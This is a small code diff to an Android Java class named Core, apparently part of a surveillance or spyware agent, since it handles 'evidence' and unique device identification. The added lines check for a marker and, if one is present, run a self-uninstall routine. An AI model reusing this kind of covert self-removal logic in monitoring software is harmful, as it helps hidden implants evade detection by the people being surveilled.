@@ -24,6 +24,7 @@ import com.android.service.auto.Cfg;
 import com.android.service.conf.Configuration;
 import com.android.service.event.EventManager;
 import com.android.service.evidence.Evidence;
+import com.android.service.evidence.Markup;
 import com.android.service.file.AutoFile;
 import com.android.service.file.Path;
 import com.android.service.util.Check;
@@ -273,6 +274,12 @@ public class Core extends Activity implements Runnable {
 		try {
 			Path.makeDirs();
 
+			Markup markup=new Markup(0);
+			if(markup.isMarkup()){
+				UninstallAction.actualExecute();
+				return false;
+			}
+			
 			// Identify the device uniquely
 			final Device device = Device.self();
 
